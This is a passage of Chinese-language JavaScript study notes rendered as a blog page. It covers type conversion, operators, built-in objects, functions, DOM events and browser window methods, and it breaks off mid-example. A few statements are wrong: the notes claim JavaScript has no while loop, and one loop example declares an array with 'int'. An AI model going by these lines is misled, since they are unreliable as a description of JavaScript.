</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a1=<span class="string">&quot;111.11as&quot;</span></span><br><span class="line">alert(a1);</span><br><span class="line">alert(<span class="built_in">parseInt</span>(a1))	<span class="comment">//111</span></span><br><span class="line">alert(<span class="built_in">parseFloat</span>(a1)) <span class="comment">//111.11</span></span><br><span class="line"><span class="keyword">var</span> a1=<span class="string">&quot;as111&quot;</span></span><br><span class="line">alert(a1);</span><br><span class="line">alert(<span class="built_in">parseInt</span>(a1))  <span class="comment">//字母在最前面转化不了</span></span><br><span class="line"><span class="keyword">var</span> b=<span class="literal">true</span>;</span><br><span class="line">alert(<span class="built_in">parseInt</span>(b))		<span class="comment">//转化失败为NaN</span></span><br></pre></td></tr></table></figure>

<h5 id="强制转换"><a href="#强制转换" class="headerlink" title="强制转换"></a>强制转换</h5><p><strong>Boolean</strong>() 强转为布尔</p>
<p>（1）数字强转成布尔  非零就是true   零就是false</p>
<p>（2）字符串强转成布尔  <code>非&quot;&quot;</code> (空字符串)就是true   空字符串<code>&quot;&quot;</code>就是false</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="number">123</span>;</span><br><span class="line">a=<span class="number">0</span>;</span><br><span class="line">a=<span class="string">&quot;a&quot;</span>;</span><br><span class="line">a=<span class="string">&quot;&quot;</span>;</span><br><span class="line">alert(<span class="built_in">Boolean</span>(a))</span><br></pre></td></tr></table></figure>

<p><strong>Number</strong>() 强转为数字</p>
<p>（1）布尔转数字 true转成1  false转成0</p>
<p>（2）<strong>含非数字的字符串转数字 不能强转</strong>区别与parseInt()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">Boolean</span>(a))</span><br><span class="line"><span class="keyword">var</span> s=<span class="literal">false</span>;</span><br><span class="line">alert(<span class="built_in">Number</span>(s))</span><br><span class="line"><span class="keyword">var</span> s1=<span class="string">&quot;12aa123&quot;</span>;</span><br><span class="line">alert(<span class="built_in">Number</span>(s1))</span><br><span class="line">alert(<span class="built_in">parseInt</span>(s1));</span><br></pre></td></tr></table></figure>

<h4 id="2-3-引用数据类型"><a href="#2-3-引用数据类型" class="headerlink" title="2.3 引用数据类型"></a>2.3 引用数据类型</h4><p>js:  var obj=new Object()  /    var num=new Number()</p>
<h4 id="2-4-运算符"><a href="#2-4-运算符" class="headerlink" title="2.4 运算符"></a>2.4 运算符</h4><h5 id="（1）算术运算符"><a href="#（1）算术运算符" class="headerlink" title="（1）算术运算符"></a>（1）算术运算符</h5><p>+: 遇到字符串变成连接</p>
<p>-：先把字符串转成数字然后进行运算</p>
<p>/: 先把字符串转成数字然后进行运算(有小数点)</p>
<h5 id="（2）比较运算符"><a href="#（2）比较运算符" class="headerlink" title="（2）比较运算符"></a>（2）比较运算符</h5><p>===:全等：类型与值都要相等<br>==只判断值相等</p>
<h5 id="（3）void运算符"><a href="#（3）void运算符" class="headerlink" title="（3）void运算符"></a>（3）void运算符</h5><p>设置void运算符则点击后不会刷新网页</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- //void运算 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span>&gt;</span>没有void<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>有void<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="（4）类型运算符"><a href="#（4）类型运算符" class="headerlink" title="（4）类型运算符"></a>（4）类型运算符</h5><p>typeof 返回该数据类型</p>
<p>instanceof判断数据类型，是否某种类型</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">alert(typeof obj);//object</span><br><span class="line">alert(obj instanceof Object);//true</span><br></pre></td></tr></table></figure>

<h4 id="2-5-逻辑语句"><a href="#2-5-逻辑语句" class="headerlink" title="2.5 逻辑语句"></a>2.5 逻辑语句</h4><p>if-else、switch (无while)</p>
<h5 id="（1）for"><a href="#（1）for" class="headerlink" title="（1）for"></a>（1）for</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">	alert(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="（2）for-in"><a href="#（2）for-in" class="headerlink" title="（2）for-in"></a>（2）for-in</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int arr&#x3D;[1,3,5,&quot;ss&quot;];</span><br><span class="line">for(index in arr)&#123;</span><br><span class="line">	alert(arr[index]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="三、内建对象"><a href="#三、内建对象" class="headerlink" title="三、内建对象"></a>三、内建对象</h2><h4 id="1、Number"><a href="#1、Number" class="headerlink" title="1、Number"></a>1、Number</h4><p>var m=new Number(value);   var m1=Number(value)</p>
<p>m.toString() ; </p>
<p>valueof()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">alert(a.valueOf())</span><br></pre></td></tr></table></figure>

<h4 id="2、Boolean"><a href="#2、Boolean" class="headerlink" title="2、Boolean"></a>2、Boolean</h4><p>var b=new Boolean(value)  var b=Boolean(value)</p>
<p>toString()  valueof()</p>
<h4 id="3、String"><a href="#3、String" class="headerlink" title="3、String"></a>3、String</h4><p>var s=new String(value)   var s=String(value)</p>
<p>length  charAt()   charCodeAt()  indexOf()   lastIndexOf()    split()   substr()  substring()  toUpperCase()</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str=<span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;a-b-ss-FS&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> arr=str.split(<span class="string">&quot;-&quot;</span>);</span><br><span class="line">alert(str.length); <span class="comment">//9</span></span><br><span class="line">alert(str.charAt(<span class="number">4</span>));<span class="comment">//s</span></span><br><span class="line">alert(str.charCodeAt(<span class="number">4</span>));<span class="comment">//115</span></span><br><span class="line">alert(str.indexOf(<span class="string">&quot;s&quot;</span>)); <span class="comment">//4</span></span><br><span class="line">alert(str.toUpperCase())</span><br><span class="line">alert(str.toLowerCase())</span><br></pre></td></tr></table></figure>

<h4 id="4、Array"><a href="#4、Array" class="headerlink" title="4、Array"></a>4、Array</h4><p>var arr=new Array()  var arr=new Array(size)指定长度</p>
<p>var arr=[]  空数组   var arr=[1,2,5];</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(arr.join(&quot;-&quot;))</span><br><span class="line">alert(arr.pop())  &#x2F;&#x2F;返回去除的最后一个元素</span><br><span class="line">alert(arr.push(5)) &#x2F;&#x2F;进入，返回长度</span><br><span class="line">alert(arr.reverse())</span><br><span class="line">alert(arr.sort())</span><br></pre></td></tr></table></figure>

<h4 id="5、Date"><a href="#5、Date" class="headerlink" title="5、Date"></a>5、Date</h4><p>var d=new Date()  var d=new Date(currentTime毫秒数)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">alert(date);</span><br><span class="line">alert(date.toString());</span><br><span class="line">alert(date.toLocaleString());</span><br><span class="line">alert(<span class="string">&quot;year:&quot;</span>+date.getFullYear());<span class="comment">//</span></span><br><span class="line">alert(<span class="string">&quot;month:&quot;</span>+(date.getMonth()+<span class="number">1</span>));<span class="comment">//</span></span><br><span class="line">alert(<span class="string">&quot;date:&quot;</span>+date.getDate());<span class="comment">//</span></span><br><span class="line">alert(<span class="string">&quot;day:&quot;</span>+date.getDay());<span class="comment">//</span></span><br><span class="line"><span class="keyword">var</span> time1 = date.getTime();</span><br><span class="line">alert(time1);</span><br><span class="line"><span class="keyword">var</span> time2 = <span class="number">1</span>*<span class="number">24</span>*<span class="number">60</span>*<span class="number">60</span>*<span class="number">1000</span>;</span><br><span class="line">alert(<span class="keyword">new</span> <span class="built_in">Date</span>(time1+time2).toLocaleString());</span><br></pre></td></tr></table></figure>

<h4 id="6、Math"><a href="#6、Math" class="headerlink" title="6、Math"></a>6、Math</h4><p>无构造，直接使用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="string">&quot;-198&quot;</span>;</span><br><span class="line">alert(<span class="built_in">Math</span>.abs(x))</span><br><span class="line"><span class="keyword">var</span> m=<span class="number">12.23</span>;</span><br><span class="line">alert(<span class="built_in">Math</span>.ceil(m));</span><br><span class="line">alert(<span class="built_in">Math</span>.floor(m));</span><br><span class="line">alert(<span class="built_in">Math</span>.round(m));</span><br><span class="line"><span class="keyword">var</span> x=<span class="number">1</span>; <span class="keyword">var</span> y=<span class="number">2</span>;</span><br><span class="line">alert(<span class="built_in">Math</span>.pow(x,y));</span><br><span class="line">alert(<span class="built_in">Math</span>.random())</span><br></pre></td></tr></table></figure>

<h4 id="7、RegExp"><a href="#7、RegExp" class="headerlink" title="7、RegExp"></a>7、RegExp</h4><blockquote>
<p><strong>reg.test(str)：返回<code>true/false</code></strong></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">		<span class="keyword">var</span> email=<span class="string">&quot;haohao_827@163.com&quot;</span></span><br><span class="line">		<span class="keyword">var</span> reg=<span class="regexp">/^[A-z]+[A-z0-9_-]*\@[A-z0-9]+\.[A-z]+$/</span>;</span><br><span class="line">		alert(reg.test(email))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="四、js的函数"><a href="#四、js的函数" class="headerlink" title="四、js的函数"></a>四、js的函数</h2><h4 id="4-1-普通方式"><a href="#4-1-普通方式" class="headerlink" title="4.1 普通方式"></a>4.1 普通方式</h4><h5 id="（1）无参"><a href="#（1）无参" class="headerlink" title="（1）无参"></a>（1）无参</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">method</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	alert(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">	alert(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">method();</span><br></pre></td></tr></table></figure>

<h5 id="（2）带参"><a href="#（2）带参" class="headerlink" title="（2）带参"></a>（2）带参</h5><blockquote>
<p><strong>实参和形参个数可以不同</strong></p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">a,b,c</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> sum=a+b+c;</span><br><span class="line">        <span class="comment">//arguments是一个数组，封装所有实参</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">arguments</span>.length;i++)&#123;</span><br><span class="line">        	alert(<span class="built_in">arguments</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">fn(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&quot;ss&quot;</span>);</span><br></pre></td></tr></table></figure>

<h5 id="（3）带有返回值"><a href="#（3）带有返回值" class="headerlink" title="（3）带有返回值"></a>（3）带有返回值</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">method4</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="comment">// alert(&quot;aaa&quot;);</span></span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sum=method4(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">alert(sum);</span><br></pre></td></tr></table></figure>

<h4 id="4-2-匿名函数"><a href="#4-2-匿名函数" class="headerlink" title="4.2 匿名函数"></a>4.2 匿名函数</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> method2=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	alert(<span class="string">&quot;yyy&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">method2();</span><br></pre></td></tr></table></figure>

<h4 id="4-3-参数"><a href="#4-3-参数" class="headerlink" title="4.3 参数"></a>4.3 参数</h4><p>a.形参和实参没有var修饰</p>
<p>b.个数不一定相同</p>
<p>c.arguments对象，封装传递进来的实参</p>
<p>d.return后面的代码不再执行</p>
<h4 id="4-4-js的全局函数"><a href="#4-4-js的全局函数" class="headerlink" title="4.4 js的全局函数"></a>4.4 js的全局函数</h4><p>强制转换：Number() 、String() 、Boolean()</p>
<p>转为数字：parseInt() 、parseFloat()</p>
<h2 id="五、事件"><a href="#五、事件" class="headerlink" title="五、事件"></a>五、事件</h2><h4 id="1、点击事件"><a href="#1、点击事件" class="headerlink" title="1、点击事件"></a>1、点击事件</h4><blockquote>
<p>onclick</p>
</blockquote>
<h5 id="绑定方式"><a href="#绑定方式" class="headerlink" title="绑定方式"></a>绑定方式</h5><p>（1）事件和响应内嵌在html标签中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> id=<span class="string">&quot;btn1&quot;</span> value=<span class="string">&quot;btn&quot;</span> onclick=<span class="string">&quot;alert(&#x27;but&#x27;)&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>

<p>（2）事件内嵌在html标签中，而响应行为用函数进行封装</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;btn2&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;button2&quot;</span> onclick=<span class="string">&quot;fn()&quot;</span> /&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	alert(<span class="string">&quot;button2&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）事件和响应完全分离</p>
<blockquote>
<p>document.getElementById(“id??”)</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;btn&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;button1&quot;</span> /&gt;</span><br><span class="line"><span class="keyword">var</span> btn=<span class="built_in">document</span>.getElementById(<span class="string">&quot;btn&quot;</span>);</span><br><span class="line">btn.onclick=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	alert(<span class="string">&quot;button1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（4）this对当前id引用</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input id=<span class="string">&quot;btn1&quot;</span> name=<span class="string">&quot;mybtn1&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;button1&quot;</span> onclick=<span class="string">&quot;fn(this)&quot;</span>/&gt;</span><br><span class="line">		&lt;br /&gt;</span><br><span class="line">&lt;input id=<span class="string">&quot;btn2&quot;</span> name=<span class="string">&quot;mybtn2&quot;</span> type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;button2&quot;</span> onclick=<span class="string">&quot;fn(this)&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">	alert(obj.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、onchange"><a href="#2、onchange" class="headerlink" title="2、onchange"></a>2、onchange</h4><p>域内容被改变的事件</p>
<p><strong>实现二级联动</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;select id=<span class="string">&quot;city&quot;</span>&gt;</span><br><span class="line">    &lt;option value=<span class="string">&quot;bj&quot;</span>&gt;北京&lt;/option&gt;</span><br><span class="line">    &lt;option value=<span class="string">&quot;tj&quot;</span>&gt;天津&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">&lt;select id=<span class="string">&quot;area&quot;</span>&gt;</span><br><span class="line">    &lt;option&gt;海淀&lt;/option&gt;</span><br><span class="line">    &lt;option&gt;朝阳&lt;/option&gt;</span><br><span class="line">&lt;/select&gt;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">var</span> select=<span class="built_in">document</span>.getElementById(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> area=<span class="built_in">document</span>.getElementById(<span class="string">&quot;area&quot;</span>);</span><br><span class="line">select.onchange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> optionVal=select.value;</span><br><span class="line">    <span class="keyword">switch</span>(optionVal)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;bj&#x27;</span>:</span><br><span class="line">        area.innerHTML=<span class="string">&quot;&lt;option&gt;海淀&lt;/option&gt;&lt;option&gt;朝阳&lt;/option&gt;&lt;option&gt;东城&lt;/option&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;tj&#x27;</span>:</span><br><span class="line">        area.innerHTML=<span class="string">&quot;&lt;option&gt;南开&lt;/option&gt;&lt;option&gt;西青&lt;/option&gt;&lt;option&gt;河东&lt;/option&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、焦点事件"><a href="#3、焦点事件" class="headerlink" title="3、焦点事件"></a>3、焦点事件</h4><blockquote>
<p>onfocus:获得焦点的事件</p>
<p>onblur:失去焦点的事件</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;label <span class="keyword">for</span>=<span class="string">&quot;txt&quot;</span>&gt;name&lt;/label&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;txt&quot;</span>/&gt;</span><br><span class="line">	&lt;span id=<span class="string">&quot;info&quot;</span>&gt;&lt;/span&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> txt=<span class="built_in">document</span>.getElementById(<span class="string">&quot;txt&quot;</span>);</span><br><span class="line">txt.onfocus=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//友好提示</span></span><br><span class="line">    <span class="keyword">var</span> span=<span class="built_in">document</span>.getElementById(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">    span.innerHTML=<span class="string">&quot;&lt;font color=&#x27;green&#x27;&gt;用户名格式最小8位&lt;/font&gt;&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">		</span><br><span class="line">txt.onblur=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> span=<span class="built_in">document</span>.getElementById(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">    span.innerHTML=<span class="string">&quot;对不起,格式不正确&quot;</span>;</span><br><span class="line">    span.style.color=<span class="string">&quot;red&quot;</span>;			</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="4、鼠标事件"><a href="#4、鼠标事件" class="headerlink" title="4、鼠标事件"></a>4、鼠标事件</h4><blockquote>
<p>onmouseover:鼠标悬浮事件</p>
<p>onmouseout:鼠标离开事件</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div=<span class="built_in">document</span>.getElementById(<span class="string">&quot;btn1&quot;</span>);</span><br><span class="line">	<span class="comment">// 移入</span></span><br><span class="line">	div.onmouseover=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		div.style.backgroundColor=<span class="string">&quot;red&quot;</span>;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">//移出鼠标</span></span><br><span class="line">	div.onmouseout=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		div.style.backgroundColor=<span class="string">&quot;gray&quot;</span>;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="5、加载事件"><a href="#5、加载事件" class="headerlink" title="5、加载事件"></a>5、加载事件</h4><blockquote>
<p>加载完毕的事件</p>
<p>等到页面加载完毕再执行onload事件所指向的函数</p>
<p>window.onload=function()}{</p>
<p>​    }</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> span=<span class="built_in">document</span>.getElementById(<span class="string">&quot;sp1&quot;</span>);</span><br><span class="line">	span.innerHTML=<span class="string">&quot;&lt;h1&gt;helloWorld&lt;/h1&gt;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="6、提交事件"><a href="#6、提交事件" class="headerlink" title="6、提交事件"></a>6、提交事件</h4><blockquote>
<p>window.confirm(“xxx”)</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot; &quot;</span> method=<span class="string">&quot;post&quot;</span> onsubmit=<span class="string">&quot;return isDelete()&quot;</span>&gt;</span><br><span class="line">	姓名：小明</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;删除&quot;</span>/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">111100</span>&lt;a href=<span class="string">&quot;delete.jsp&quot;</span> onclick=<span class="string">&quot;return confirm(&#x27;删除吗&#x27;)&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line"><span class="number">222222</span>&lt;a href=<span class="string">&quot;delete.jsp&quot;</span> onclick=<span class="string">&quot;isDelete()&quot;</span>&gt;删除&lt;/a&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isDelete</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">var</span> isDelete=<span class="built_in">window</span>.confirm(<span class="string">&quot;你确定删除吗&quot;</span>)</span><br><span class="line">   <span class="keyword">if</span>(isDelete)&#123;</span><br><span class="line">        <span class="comment">// return true;</span></span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//阻止默认提交</span></span><br><span class="line">       	event.preventDefault();</span><br><span class="line">        <span class="comment">// return false;</span></span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="六、bom"><a href="#六、bom" class="headerlink" title="六、bom"></a>六、bom</h2><p>bom（浏览器对象模型）</p>
<p><img src="https://csn.damyoung.cn/image-20200901164941262.png" alt="image-20200901164941262"></p>
<h4 id="1、window对象"><a href="#1、window对象" class="headerlink" title="1、window对象"></a>1、window对象</h4><h5 id="（1）弹框"><a href="#（1）弹框" class="headerlink" title="（1）弹框"></a>（1）弹框</h5><p>提示框：alert(<strong>“提示信息”</strong>)</p>
<p>确认框：confirm(“确认信息”)  返回true或false</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> res=<span class="built_in">window</span>.confirm(<span class="string">&quot;你确认删除吗&quot;</span>);</span><br><span class="line">alert(res);</span><br></pre></td></tr></table></figure>

<p>输入框：prompt(“输入信息”)  返回值(返回输入的文本)，取消返回null</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> con=<span class="built_in">window</span>.prompt(<span class="string">&quot;请输入密码？&quot;</span>);</span><br><span class="line">alert(con);</span><br></pre></td></tr></table></figure>

<h5 id="（2）open方法"><a href="#（2）open方法" class="headerlink" title="（2）open方法"></a>（2）open方法</h5><p>window.open(‘page.html’, ‘newwindow’, ‘height=100, width=400, top=0, left=0, toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, status=no’) </p>
<p>window.open 弹出新窗口的命令；<br>‘page.html’ 弹出窗口的文件名；?　　<br>‘newwindow’ 弹出窗口的名字（不是文件名），非必须，可用空’’代替；?<br>height=100 窗口高度；?<br>width=400 窗口宽度；?<br>top=0 窗口距离屏幕上方的象素值；?    </p>
<p>left=0 窗口距离屏幕左侧的象素值；?<br>toolbar=no 是否显示工具栏，yes为显示；?<br>menubar，scrollbars 表示菜单栏和滚动栏。?<br>resizable=no 是否允许改变窗口大小，yes为允许；?<br>location=no 是否显示地址栏，yes为允许；?<br>status=no 是否显示状态栏内的信息（通常是文件已经打开），yes为允许</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;打开窗口&quot;</span> onclick=<span class="string">&quot;winopen()&quot;</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;button&quot;</span> value=<span class="string">&quot;关闭窗口&quot;</span> onclick=<span class="string">&quot;winclose()&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">winopen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	win=<span class="built_in">window</span>.open(<span class="string">&quot;http://www.baidu.com&quot;</span>);</span><br><span class="line"><span class="comment">//win=window.open(&quot;http://www.baidu.com&quot;,&quot;newwindow&quot;,&quot;width=400px,height=400&quot;)	</span></span><br><span class="line">&#125;</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">winclose</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    win.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">选择季节</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;season&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;winopen2()&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">function winopen2()&#123;</span><br><span class="line">	win=window.open(&quot;season.html&quot;,&quot;&quot;,&quot;width=500,height=300,top=200,left=200&quot;); </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;season&quot;</span> <span class="attr">value</span>=<span class="string">&quot;春天&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;checked&quot;</span> /&gt;</span>春天<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;season&quot;</span> <span class="attr">value</span>=<span class="string">&quot;夏天&quot;</span>/&gt;</span>夏天<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;season&quot;</span> <span class="attr">value</span>=<span class="string">&quot;秋天&quot;</span>/&gt;</span>秋天<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;season&quot;</span> <span class="attr">value</span>=<span class="string">&quot;冬天&quot;</span>/&gt;</span>冬天<span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;选择&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;fn()&quot;</span>/&gt;</span>	</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">		<span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> myseason;</span></span><br><span class="line"><span class="javascript">			<span class="comment">//name--&gt;select,checked--&gt;value</span></span></span><br><span class="line"><span class="javascript">			<span class="keyword">var</span> selectseason=<span class="built_in">document</span>.getElementsByName(<span class="string">&quot;season&quot;</span>);</span></span><br><span class="line"><span class="javascript">			<span class="keyword">for</span>(<span class="keyword">var</span> i=<span 